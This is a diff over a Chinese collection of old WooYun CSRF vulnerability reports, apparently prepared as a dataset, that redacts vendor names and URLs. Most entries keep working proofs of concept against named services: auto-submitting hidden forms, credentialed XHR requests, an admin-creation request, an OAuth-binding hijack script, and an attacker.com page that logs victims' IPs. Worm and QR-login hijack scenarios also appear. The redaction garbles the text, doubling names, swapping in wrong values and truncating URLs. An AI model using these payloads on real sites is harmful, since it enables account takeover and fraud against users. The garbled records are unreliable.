-**详情**: 前面发完再看了下，发现sohu全站都基本没有对csrf作任何处理。。。。再发一次，提醒一下你们了。按照我混wooyun的经验，一个漏洞补好后，一定会在周边看看有没有同样的洞存在。再随便找一个，passport的csrf。passport的利害性我就不说了。这里演示修改用户身份证名字啦什么的，页面上说，身份证是找回帐号的唯一哦。。。 这次用GET，referer检测都失效了。而且不需要用户点击，打开邮箱/微播直接中标。额外的一个严重漏洞是，在页面上，身份证一设定就再不能修改了，可是我的csrf随便改。。。那限制直接无视。利用情景可以想象的。这个csrf发完我就不再发了看你们运气吧，你们好好审核代码吧，我估计通宵加班少不了了。。。补充一句，邮箱只是我利用的一个情景，其实，不管是微博还是博客还是论坛，都可以成为利用道具的。
+**详情**: 前面发完再看了下，发现sohu全站都基本没有对csrf作任何处理。。。。再发一次，提醒一下你们了。按照我混wooyun的经验，一个漏洞补好后，一定会在周边看看有没有同样的洞存在。再随便找一个，passport的csrf。passport的利害性我就不说了。这里演示修改用户身份证名字啦什么的，页面上说，身份证是找回帐号的唯一哦。。。 这次用GET，referer检测都失效了。而且不需要用户点击，打开邮箱/微播直接中标。额外的一个严重漏洞是，在页面上，身份证一设定就再不能修改了，可是我的csrf随便改。。。那限制直接无视。利用情景可以想象的。这个csrf发完我就不再发了看你们运气吧，你们好好审核代码吧，我估计通宵加班少不了了。。。补充一句，邮箱只是我利用的一个情景，其实，不管是某社交平台还是博客还是论坛，都可以成为利用道具的。
 
 **POC**: 我演示是为了自己方便，其实用<img src>直接暴的。
 
@@ -1731,7 +1731,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: url:http://my.xizi.com/index.php?r=message/ajaxadddata&callback=jQuery17203734854192007333_1382543581696&tousername=收信的ID&content=信息内容&_=1382543598882发私信无需验证码,信息内容为广告.收信ID变量,每个人都能收到我发的广告~~
+**详情**: url:https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -1763,8 +1763,8 @@
 ---
 
 ---
-### [wooyun-2013-026622] 新浪微博关注CSRF
-**厂商**: 新浪 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-026622] 某社交平台某社交平台关注CSRF
+**厂商**: 某社交平台 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -1775,9 +1775,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: API出现位置:http://us.weibo.com/api/create_friend没有判断token referer咩的，只有u内容为微博id，好了，测试一下。
+**详情**: API出现位置:https://example.com/[已脱敏] referer咩的，只有u内容为某社交平台id，好了，测试一下。
 
-**POC**: <form method='post' action='http://us.weibo.com/api/create_friend'><input type='text' value='1981622273' name='u' style='display:none!important;display:block;width=0;height=0' /></form><script>document.forms[0].submit();</script>页面保存 u值为微博id 默认关注乌云微博。
+**POC**: <form method='post' action='https://example.com/[已脱敏]'><input type='text' value='1981622273' name='u' style='display:none!important;display:block;width=0;height=0' /></form><script>document.forms[0].submit();</script>页面保存 u值为某社交平台id 默认关注乌云某社交平台。
 
 **绕过**: 直接利用
 
@@ -1797,9 +1797,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在人人开放平台无任何token造成了被csrf攻击的对象编辑处无tokenhttp://app.renren.com/developers/baseinfo/savename=wooyun&type=0&area=2%234&phone=13100138000&email=189837992%40qq.com&imType=QQ&imId=112312&completeness=60%25&companyAddress=&companyPostCode=&companyExigencyContact=&companyExigencyPhone=参数大概的意思就不多说了，我们把昵称改成wooyun.orgname=wooyun.org&type=0&area=2%234&phone=13100138000&email=189837992%40qq.com&imType=QQ&imId=112
+**详情**: 在人人开放平台无任何token造成了被csrf攻击的对象编辑处无tokenhttps://example.com/[已脱敏]
 
-**POC**: 在人人开放平台无任何token造成了被csrf攻击的对象编辑处无tokenhttp://app.renren.com/developers/baseinfo/savename=wooyun&type=0&area=2%234&phone=13100138000&email=189837992%40qq.com&imType=QQ&imId=112312&completeness=60%25&companyAddress=&companyPostCode=&companyExigencyContact=&companyExigencyPhone=参数大概的意思就不多说了，我们把昵称改成wooyu
+**POC**: 在人人开放平台无任何token造成了被csrf攻击的对象编辑处无tokenhttps://example.com/[已脱敏]
 
 **绕过**: 过滤绕过
 
@@ -1819,7 +1819,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题出现在收货地址http://shop.zhe800.com/users/addresses添加新的收货地址看看我们可以看到有一个postcode，貌似是来做请求来源检测的，不过好像没什么用。<form method="POST" name="form0" action="http://shop.zhe800.com:80/users/addresses"><input type="hidden" name="receiverName" value="111"/><input type="hidden" name="mobile" value="13800138000"/><input type="hidden" name="email" value=""/><input type="hidden" name="telCode" value=""/><input type="hidden
+**详情**: 问题出现在收货地址https://example.com/[已脱敏] method="POST" name="form0" action="https://example.com/[已脱敏]"><input type="hidden" name="receiverName" value="111"/><input type="hidden" name="mobile" value="13800138000"/><input type="hidden" name="email" value=""/><input type="hidden" name="telCode" value=""/><input type="hidden
 
 **POC**: 其实可以发现我表单写的postcode不是上图截下来的400000，是另外一个。那么使用519100这个code是否可以达到我们的目标呢？让我们看看可以看到转向页面报错了，那么我们再看看收货地址有没有增加可以看到页面报错，但是地址确实增加了。让我们再把code值改回400000看看可以看到是这样的，那么回到收货地址看看增加了。
 
@@ -1829,8 +1829,8 @@
 ---
 
 ---
-### [wooyun-2012-08579] 新浪微博某处CSRF漏洞
-**厂商**: 新浪 | **年份**: 2012 | **类型**: CSRF
+### [wooyun-2012-08579] 某社交平台某社交平台某处CSRF漏洞
+**厂商**: 某社交平台 | **年份**: 2012 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -1843,7 +1843,7 @@
 
 **详情**: 在接受POST和GET的信息的时候，未对POST来路(Referer)进行验证，同时也没有在POST的信息中加token验证信息的正确性，导致漏洞产生。
 
-**POC**: 漏洞地址：http://app.weibo.com/aj_checkin.php<html><body><form id="imlonghao" name="imlonghao" action="http://app.weibo.com/aj_checkin.php" method="post"><input type="text" name="content" value="XXXXXXXXXXXXX" /><input type="text" name="_t" value="0" /><input type="submit" value="submit" /></form><script
+**POC**: 漏洞地址：https://example.com/[已脱敏] id="imlonghao" name="imlonghao" action="https://example.com/[已脱敏]" method="post"><input type="text" name="content" value="XXXXXXXXXXXXX" /><input type="text" name="_t" value="0" /><input type="submit" value="submit" /></form><script
 
 **绕过**: 直接利用
 
@@ -1863,9 +1863,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 就拿你们的演示站点做了测试（是T3的最新版本）http://demo.thinksns.com/------ThinkSNS最新版本内对于POST请求的来源是进行了判断的但是ThinkSNS最新版本对于POST和GET请求是不分的，而且GET请求的是可以在网站内用<img>标签发起的，将导致严重的安全问题，我就选取了一些发上来。
+**详情**: 就拿你们的演示站点做了测试（是T3的最新版本）https://example.com/[已脱敏]
 
-**POC**: 1）更改个人设置中的隐私设置（通过GET请求实现）http://demo.thinksns.com/t3/index.php?app=public&mod=Account&act=doSavePrivacy&comment_weibo=1&message=1&space=12）发起大量垃圾投票（可刷分/通过GET请求实现）：http://demo.thinksns.com/t3/index.php?app=vote&mod=Index&act=add&date=7&opt%5B%5D=%E4%BD%A0%E5%B8%85&opt%5B%5D=%E6%88%91%E5%B8%85&title=%
+**POC**: 1）更改个人设置中的隐私设置（通过GET请求实现）https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -1873,8 +1873,8 @@
 ---
 
 ---
-### [wooyun-2013-027684] 新浪博客csrf漏洞--自动退出
-**厂商**: 新浪 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-027684] 某社交平台博客csrf漏洞--自动退出
+**厂商**: 某社交平台 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 认证接口
 
@@ -1885,9 +1885,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 废话篇：本来不想提交的，但是我自己也登不上去了（也不知道怎么办了），为了我的博客（虽然是用来实验的）能继续登陆，不得不提交正文篇：新浪博客，插入图片直接输入http://login.sina.com.cn/cgi/login/logout.php，然后点击添加（需要抓包小小的改动一下，否则发不了文章）之后发表了文章，然后你就会悲剧的发现自己登不了这个博客了
+**详情**: 废话篇：本来不想提交的，但是我自己也登不上去了（也不知道怎么办了），为了我的博客（虽然是用来实验的）能继续登陆，不得不提交正文篇：某社交平台博客，插入图片直接输入https://example.com/[已脱敏]
 
-**POC**: 看看这个地址：http://blog.sina.com.cn/s/blog_c46dfc2d0101iqwy.html登陆后，然后评论，正常请情况下能做到不匿名评论吗？废话篇（接上）：这才反映过来犯二了，我可以登录的，只要抓包丢包就可以了。既然写了那么多，删了可惜了，还是提交吧
+**POC**: 看看这个地址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -1909,7 +1909,7 @@
 
 **详情**: UI中国关注功能设计缺陷导致跨站请求伪造(CSRF)#3
 
-**POC**: poc：<html><head><meta http-equiv="Content-Type" content="text/html; charset=GB2312"><title>CSRF  POC</title></head><body><form action="http://i.ui.cn/follow" method="post"><input type="hidden" name="act" value="follow"/><input type="hidden" name="ct" value="add"/><input type="hidden" name="followid"
+**POC**: poc：<html><head><meta http-equiv="Content-Type" content="text/html; charset=GB2312"><title>CSRF  POC</title></head><body><form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="act" value="follow"/><input type="hidden" name="ct" value="add"/><input type="hidden" name="followid"
 
 **绕过**: 直接利用
 
@@ -1917,8 +1917,8 @@
 ---
 
 ---
-### [wooyun-2015-0160261] 新浪微博CSRF之点我链接就会关注
-**厂商**: 新浪微博 | **年份**: 2015 | **类型**: CSRF
+### [wooyun-2015-0160261] 某社交平台某社交平台CSRF之点我链接就会关注
+**厂商**: 某社交平台某社交平台 | **年份**: 2015 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -1929,9 +1929,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题页面：http://movie.weibo.com/rank在点击分享榜单的时候，会先发送一个请求关注“微博电影板”，不需要经过用户同意。接口如下：http://movie.weibo.com/movie/web/follow这个接口防范CSRF是通过判断referer来实现的，然后可以被绕过。只要是以movie.weibo.com.开头的任意子域名都可以绕过。比如：http://movie.weibo.com.test.com
+**详情**: 问题页面：https://example.com/[已脱敏]
 
-**POC**: 这里我们以昨日@gainover在微博上曝光的@呆子不开口的年轻时候的恋人 @我是王学翠进行证明。我的马甲号：可以看到目前关注数是37个人。访问测试页面：http://movie.weibo.com.zhchbin.xyz注：访问不了的话请本地改下hosts验证，或者burpsuite抓包改referrer，***求审核好之后帮我的域名打码！***页面内容：<form action="http://movie.weibo.com/movie/web/follow" method="post"><input type="text" name="uid" value="5787593657" />
+**POC**: 这里我们以昨日@gainover在某社交平台上曝光的@呆子不开口的年轻时候的恋人 @我是王学翠进行证明。我的马甲号：可以看到目前关注数是37个人。访问测试页面：https://example.com/[已脱敏] action="https://example.com/[已脱敏]" method="post"><input type="text" name="uid" value="5787593657" />
 
 **绕过**: 过滤绕过
 
@@ -1973,7 +1973,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 圆通旗下一城一品网修改收货地址处存在csrfhttp://www.yichengpin.com修改收货地址，抓包：无不可预测参数，故可伪造csrf。主要代码：xmlhttp.open("POST", "http://www.yichengpin.com/address/address-addAddress.do", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("receiverAdd.receiverName=woo126qqqq&receiverAdd.mobile=13611111111&receiverAdd.detailAddress=fwagrfagrasgre&recei
+**详情**: 圆通旗下一城一品网修改收货地址处存在csrfhttps://example.com/[已脱敏]"POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("receiverAdd.receiverName=woo126某互联网公司某互联网公司&receiverAdd.mobile=13611111111&receiverAdd.detailAddress=fwagrfagrasgre&recei
 
 **POC**: 以证明
 
@@ -1983,8 +1983,8 @@
 ---
 
 ---
-### [wooyun-2016-0170272] 点我的链接我就可能会进入你的网易云音乐
-**厂商**: 网易 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2016-0170272] 点我的链接我就可能会进入你的某互联网公司云音乐
+**厂商**: 某互联网公司 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 参数注入, 认证接口, 后台管理
 
@@ -1995,9 +1995,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 网易云音乐的接口都用了Token来防止CSRF，然后百密一疏，在正常的微博的绑定接口中，分以下几个步骤走1. 用户点击绑定按钮，向后台发起绑定的请求，GET /api/sns/authorize2. 302到微博的授权页面：https://api.weibo.com/oauth2/authorize3. 用户授权完成，回调到http://music.163.com/back/weibo，并带上了授权得到的Access Token问题就出在最后一步中，虽然第二步的参数中带上了state的参数，但是经过验证这个参数好像没有好好用上，而且这个参数对于新浪微博的API来说不是必须的，引用一下新浪的文档：用于保持请求和回调的状态，在回调时，会在Query Parameter中回传该参数。开发者可以用这个参数验证请求有效性，也可以记录用户请求授权页前的位置。这个参数可用于防止跨站请求伪造（CSRF）攻
+**详情**: 某互联网公司云音乐的接口都用了Token来防止CSRF，然后百密一疏，在正常的某社交平台的绑定接口中，分以下几个步骤走1. 用户点击绑定按钮，向后台发起绑定的请求，GET /api/sns/authorize2. 302到某社交平台的授权页面：https://example.com/[已脱敏] 用户授权完成，回调到https://example.com/[已脱敏] Token问题就出在最后一步中，虽然第二步的参数中带上了state的参数，但是经过验证这个参数好像没有好好用上，而且这个参数对于某社交平台某社交平台的API来说不是必须的，引用一下某社交平台的文档：用于保持请求和回调的状态，在回调时，会在Query Parameter中回传该参数。开发者可以用这个参数验证请求有效性，也可以记录用户请求授权页前的位置。这个参数可用于防止跨站请求伪造（CSRF）攻
 
-**POC**: 测试代码，pip安装一下requests, BeautifuSoup, Flask，改一下下面的微博账号和密码（记得需要先授权），然后访问一下即可：# -*- coding: utf-8 -*-import requestsimport refrom flask import Flaskfrom BeautifulSoup import BeautifulSoupapp = Flask(__name__)login_weibo_form = u'''<form action="http://login.weibo.cn/login/" method="post"><input type="te
+**POC**: 测试代码，pip安装一下requests, BeautifuSoup, Flask，改一下下面的某社交平台账号和密码（记得需要先授权），然后访问一下即可：# -*- coding: utf-8 -*-import requestsimport refrom flask import Flaskfrom BeautifulSoup import BeautifulSoupapp = Flask(__name__)login_weibo_form = u'''<form action="https://example.com/[已脱敏]" method="post"><input type="te
 
 **绕过**: 直接利用
 
@@ -2017,7 +2017,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.jjwxc.cn我们登录帐号1抓包看看收货地址看没有token 没有验证好我们构造poc我们登录帐号2 进行访问我们访问csrf那个文件看已经成功了
+**详情**: https://example.com/[已脱敏] 没有验证好我们构造poc我们登录帐号2 进行访问我们访问csrf那个文件看已经成功了
 
 **POC**: (见原文)
 
@@ -2061,9 +2061,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 昵图网账户信息->密码修改处，对未设置过支付密码的用户，存在CSRF，可被恶意设置支付密码http://user.nipic.com/memberinfo/password
+**详情**: 昵图网账户信息->密码修改处，对未设置过支付密码的用户，存在CSRF，可被恶意设置支付密码https://example.com/[已脱敏]
 
-**POC**: POC：<form name="csrf" action="http://user.nipic.com/memberajax/SetSellPwd" method="POST"><input type=text name="sellPwd" value="abcdef1!"></input><input type=text name="sellPwdConfirm" value="abcdef1!"></input><input type="submit" value="submit" /></form><script>document.csrf.submit();</script>
+**POC**: POC：<form name="csrf" action="https://example.com/[已脱敏]" method="POST"><input type=text name="sellPwd" value="abcdef1!"></input><input type=text name="sellPwdConfirm" value="abcdef1!"></input><input type="submit" value="submit" /></form><script>document.csrf.submit();</script>
 
 **绕过**: 直接利用
 
@@ -2071,8 +2071,8 @@
 ---
 
 ---
-### [wooyun-2012-08529] 新浪微博某处CSRF漏洞
-**厂商**: 新浪 | **年份**: 2012 | **类型**: CSRF
+### [wooyun-2012-08529] 某社交平台某社交平台某处CSRF漏洞
+**厂商**: 某社交平台 | **年份**: 2012 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -2085,7 +2085,7 @@
 
 **详情**: 在接受POST和GET的信息的时候，未对POST来路(Referer)进行验证，同时也没有在POST的信息中加token验证信息的正确性，导致漏洞产生。
 
-**POC**: 漏洞地址：http://all.vic.sina.com.cn/tsingtaoeuro/api/send.php<html><body><form id="imlonghao" name="imlonghao" action="http://all.vic.sina.com.cn/tsingtaoeuro/api/send.php" method="post"><input type="text" name="content" value="XX" /><input type="submit" value="submit" /></form><script>document.imlongha
+**POC**: 漏洞地址：https://example.com/[已脱敏] id="imlonghao" name="imlonghao" action="https://example.com/[已脱敏]" method="post"><input type="text" name="content" value="XX" /><input type="submit" value="submit" /></form><script>document.imlongha
 
 **绕过**: 直接利用
 
@@ -2115,8 +2115,8 @@
 ---
 
 ---
-### [wooyun-2014-059117] 支付宝客户端扫描二维码登陆缺陷可进行账号劫持
-**厂商**: 支付宝 | **年份**: 2014 | **类型**: CSRF
+### [wooyun-2014-059117] 某电商平台客户端扫描二维码登陆缺陷可进行账号劫持
+**厂商**: 某电商平台 | **年份**: 2014 | **类型**: CSRF
 
 **元思考**: 触发信号: 认证接口
 
@@ -2127,9 +2127,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 技术细节：支付宝二维码页面：https://auth.alipay.com/login/homeB.htm?redirectType=parent该页面请求之后会返回securityId（如web|authcenter_querypwd_login|2fb227a3-e5c0-469e-b27f-471b584cf070），barcode(如https://qr.alipay.com/plpyjknzdbjrluty4b)securityId主要是来给前端轮询二维码扫描状态的；而barcode是二维码中的字符串，给手机客户端扫描用的。轮询接口：https://securitycore.alipay.com/barcode/barcodeProcessStatus.json?securityId=web|authcenter_querypwd_login|2fb227a3-e5c0-469e
+**详情**: 技术细节：某电商平台二维码页面：https://example.com/[已脱敏])securityId主要是来给前端轮询二维码扫描状态的；而barcode是二维码中的字符串，给手机客户端扫描用的。轮询接口：https://example.com/[已脱敏]
 
-**POC**: 情景模拟：当你浏览器登录支付宝的情况下，如下：你看到了一个第三方站点的二维码如下：如果网站上有一些欺骗性的语言，如支付宝客户端扫描得红包，抑或你刚用支付宝买完东西，提示你扫码可以返现之类的社会工程学来诱使你用支付宝客户端扫描二维码。其实，攻击者那边可能有一个页面一直在等待着你上钩：一旦你扫描了，然后攻击者的浏览器里就登录了你的支付宝，如下：小缺陷：1.受害者扫描之后会发现手机上的确认登录页面，但是此时攻击者已经达到了想要的目的；2.受害者浏览器支付宝的登录用户和手机上的必须一致，一般人都只有一个支付宝账号。
+**POC**: 情景模拟：当你浏览器登录某电商平台的情况下，如下：你看到了一个第三方站点的二维码如下：如果网站上有一些欺骗性的语言，如某电商平台客户端扫描得红包，抑或你刚用某电商平台买完东西，提示你扫码可以返现之类的社会工程学来诱使你用某电商平台客户端扫描二维码。其实，攻击者那边可能有一个页面一直在等待着你上钩：一旦你扫描了，然后攻击者的浏览器里就登录了你的某电商平台，如下：小缺陷：1.受害者扫描之后会发现手机上的确认登录页面，但是此时攻击者已经达到了想要的目的；2.受害者浏览器某电商平台的登录用户和手机上的必须一致，一般人都只有一个某电商平台账号。
 
 **绕过**: 直接利用
 
@@ -2159,7 +2159,7 @@
 ---
 
 ---
-### [wooyun-2014-054888] 天涯--新浪OAuth 2.0 redirect_uir CSRF 漏洞
+### [wooyun-2014-054888] 天涯--某社交平台OAuth 2.0 redirect_uir CSRF 漏洞
 **厂商**: 天涯社区 | **年份**: 2014 | **类型**: CSRF
 
 **元思考**: 触发信号: 认证接口
@@ -2171,7 +2171,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 详细说明：天涯-新浪 OAuth 2.0 认证流程中https://api.weibo.com/oauth2/authorize?client_id=482040646&response_type=code&with_offical_account=1&redirect_uri=http://passport.tianya.cn/third/sinaweibo.do天涯网并没有提供有效方式抵抗针对redirect_uir 的CSRF 攻击。如果攻击者重新发起一个天涯-新浪OAuth 2.0 认证请求，并截获OAuth 2.0 认证请求的返回。http://passport.tianya.cn/third/sinaweibo.do?code=7c0350d1c8dee1a333c15bf8725fc4f9攻击者诱骗已经登录的网用户点击(比如通过邮件或者QQ等方式）。 天涯网会自动将用户的帐号
+**详情**: 详细说明：天涯-某社交平台 OAuth 2.0 认证流程中https://example.com/[已脱敏] 的CSRF 攻击。如果攻击者重新发起一个天涯-某社交平台OAuth 2.0 认证请求，并截获OAuth 2.0 认证请求的返回。https://example.com/[已脱敏] 天涯网会自动将用户的帐号
 
 **POC**: (见原文)
 
@@ -2193,7 +2193,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 到处是CSRF啊。http://www.guokr.com/post/327306/?replypage=1#reply1895695http://www.guokr.com/post/327306/?replypage=1#reply1895697这是个普通证明,果壳网回复需要10秒嗯? 加关注+留言。。。。
+**详情**: 到处是CSRF啊。https://example.com/[已脱敏] 加关注+留言。。。。
 
 **POC**: var request = false;if(window.XMLHttpRequest) {request = new XMLHttpRequest();if(request.overrideMimeType) {request.overrideMimeType('text/xml');}} else if(window.ActiveXObject) {var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP','Msxml2.XMLHTTP.7.0','Msxml2.XMLHTTP.6.0','Msxm
 
@@ -2239,7 +2239,7 @@
 
 **详情**: 第一步 将post转成 GET请求第二步 利用日记等具备贴图功能将GET请求植入到文章中
 
-**POC**: 第一步 将post转成 GET请求http://jipin.kaixin001.com/pin/ajax/pin_repin.php?rpinid=1395316295631307&aid=1395574390490225&desc=%C7%E5%B5%AD%B5%C4%BD%F0%D5%EB%B9%BD%B6%B9%B8%AF%CC%C0%A3%AC%D2%BB%B5%E3%B4%D0%BB%A8%B0%D1%CC%C0%B5%E3%D7%BA%B5%C3%C4%C7%C3%B4%C7%A1%B5%BD%BA%C3%B4%A6%A1%A3&url=http%3A%2F%2Fwww.duita
+**POC**: 第一步 将post转成 GET请求https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -2259,9 +2259,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://tj.fruitday.com/login.php，登陆页面存在csrf，可以构造post请求，重置管理员密码
+**详情**: https://example.com/[已脱敏]
 
-**POC**: POST /model/edituser.php?id=3 HTTP/1.1Content-Length: 37Pragma: no-cacheCache-Control: no-cacheReferer: http://tj.fruitday.com/model/user.phpAcunetix-Aspect: enabledAcunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66cAcunetix-Aspect-Queries: filelist;aspectalertsCookie: PHPSESSID=vuem5apdi7g7g
+**POC**: POST /model/edituser.php?id=3 HTTP/1.1Content-Length: 37Pragma: no-cacheCache-Control: no-cacheReferer: https://example.com/[已脱敏] enabledAcunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66cAcunetix-Aspect-Queries: filelist;aspectalertsCookie: PHPSESSID=vuem5apdi7g7g
 
 **绕过**: 直接利用
 
@@ -2281,7 +2281,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 后台管理中的数据备份功能未进行csrf token验证。攻击者制作内容如下的csrf.php并放到attacker.com下面：<?phpfile_put_contents("test.txt",  " IP:".$_SERVER["REMOTE_ADDR"], FILE_APPEND);file_put_contents("test.txt",  " Time:".date("Y.m.d H:i:s"),FILE_APPEND);?><img src="http://victim.com/admin/?controller=dbmanage&operate=save&type=0">随后将http://attacker.com/csrf.php这个URL发送给受害者（网站管理员）。如果管理员在打开该URL时处于登录状态就会以管理员的身份像目标服务器发送备份数据库的请求：?controll
+**详情**: 后台管理中的数据备份功能未进行csrf token验证。攻击者制作内容如下的csrf.php并放到attacker.com下面：<?phpfile_put_contents("test.txt",  " IP:".$_SERVER["REMOTE_ADDR"], FILE_APPEND);file_put_contents("test.txt",  " Time:".date("Y.m.d H:i:s"),FILE_APPEND);?><img src="https://example.com/[已脱敏]">随后将https://example.com/[已脱敏]
 
 **POC**: 攻击者成功得到备份数据库路径，并进行下载：
 
@@ -2325,9 +2325,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: phpwind 9.0加关注 刷粉..直接修改uid 后面参数即可..http://127.0.0.1:8282/index.php?m=my&c=follow&a=add&uid=1删除也可以http://127.0.0.1:8282/index.php?m=my&c=follow&a=delete&uid=1看图吧
+**详情**: phpwind 9.0加关注 刷粉..直接修改uid 后面参数即可..http://[IP已脱敏]
 
-**POC**: phpwind 9.0加关注 刷粉..直接修改uid 后面参数即可..http://127.0.0.1:8282/index.php?m=my&c=follow&a=add&uid=1删除也可以http://127.0.0.1:8282/index.php?m=my&c=follow&a=delete&uid=1看图吧
+**POC**: phpwind 9.0加关注 刷粉..直接修改uid 后面参数即可..http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -2347,7 +2347,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 删除收货地址，并抓包虽然有token值，但经测试，发现他是固定值，实为摆设。构造csrf链接（改变id即可）xmlhttp.open("POST", "http://tg.tttuangou.net/api.php", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("appcode=android&id=943&r=%2Faddress%2Fdelete&token=45ea04c221bceff4190afe03d5cd5103");访问链接删除地址成功，刷新收货地址，验证。
+**详情**: 删除收货地址，并抓包虽然有token值，但经测试，发现他是固定值，实为摆设。构造csrf链接（改变id即可）xmlhttp.open("POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("appcode=android&id=943&r=%2Faddress%2Fdelete&token=45ea04c221bceff4190afe03d5cd5103");访问链接删除地址成功，刷新收货地址，验证。
 
 **POC**: 同上
 
@@ -2369,13 +2369,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 果壳社区的绑定微博登陆的请求为https://account.guokr.com/weibo/sign_in/?success=https%3A%2F%2Faccount.guokr.com%2Fsettings%2Fexternal_account%2F此请求并未做csrf防护，攻击者可以在第三方网页中伪造此请求新浪微博的授权有如下特点，如果当前登陆的微博曾经授权过果壳，那么就会自动绑定成功所以我们可以找一个新浪微博登陆的csrf漏洞，让用户自动登陆攻击者的微博（新浪有此类漏洞，这里就不详细写出）然后再让用户访问绑定请求，这样就完成了对攻击者微博的绑定。攻击者使用微博登陆就可以进入用户的果壳账号
+**详情**: 果壳社区的绑定某社交平台登陆的请求为https://example.com/[已脱敏]
 
-**POC**: 已录视频http://v.youku.com/v_show/id_XMTQxNzEzNjgxNg==.html密码：198625
+**POC**: 已录视频https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
-**修复**: 增加csrf防护微博绑定强制使用微博用户名密码登陆
+**修复**: 增加csrf防护某社交平台绑定强制使用某社交平台用户名密码登陆
 ---
 
 ---
@@ -2391,7 +2391,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 麦单网发表分享处无token虽然请求为POST，但GET也可，危害瞬间提高了一个等级啊。POC:http://www.imaidan.com/uc_topic-add?content=testcsrf访问该网址后，用户会被发出一条"testcsrf"的分享，如果在这条分享中，又包含以上POC，将会引发大规模蠕虫。
+**详情**: 麦单网发表分享处无token虽然请求为POST，但GET也可，危害瞬间提高了一个等级啊。POC:https://example.com/[已脱敏]"testcsrf"的分享，如果在这条分享中，又包含以上POC，将会引发大规模蠕虫。
 
 **POC**: (见原文)
 
@@ -2401,8 +2401,8 @@
 ---
 
 ---
-### [wooyun-2013-035940] 新浪另类CSRF蠕虫放大危害
-**厂商**: 新浪 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-035940] 某社交平台另类CSRF蠕虫放大危害
+**厂商**: 某社交平台 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -2415,7 +2415,7 @@
 
 **详情**: 一个<from>标签引发的血案。
 
-**POC**: 我们知道新浪博客有一个转载功能：我们来试试其中一个，轻博客。构造如下HTML发布到博客首页的自定义组件里。<form name="IjaxForm" action="http://control.blog.sina.com.cn/blog_rebuild/riaapi/blog/share2qing.php?domain=1" method="post" target="loadingIframe_thread3561"><input type="hidden" name="version" value="7"><input type="hidden" name="blogId" value=
+**POC**: 我们知道某社交平台博客有一个转载功能：我们来试试其中一个，轻博客。构造如下HTML发布到博客首页的自定义组件里。<form name="IjaxForm" action="https://example.com/[已脱敏]" method="post" target="loadingIframe_thread3561"><input type="hidden" name="version" value="7"><input type="hidden" name="blogId" value=
 
 **绕过**: 直接利用
 
@@ -2437,7 +2437,7 @@
 
 **详情**: 可以通过这个csrf到管理员权限
 
-**POC**: POST /dao/www/index.php?m=user&f=create&dept=0 HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:35.0) Gecko/20100101 Firefox/35.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflate
+**POC**: POST /dao/www/index.php?m=user&f=create&dept=0 HTTP/1.1Host: [IP已脱敏]User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:35.0) Gecko/20100101 Firefox/35.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflate
 
 **绕过**: 直接利用
 
@@ -2445,8 +2445,8 @@
 ---
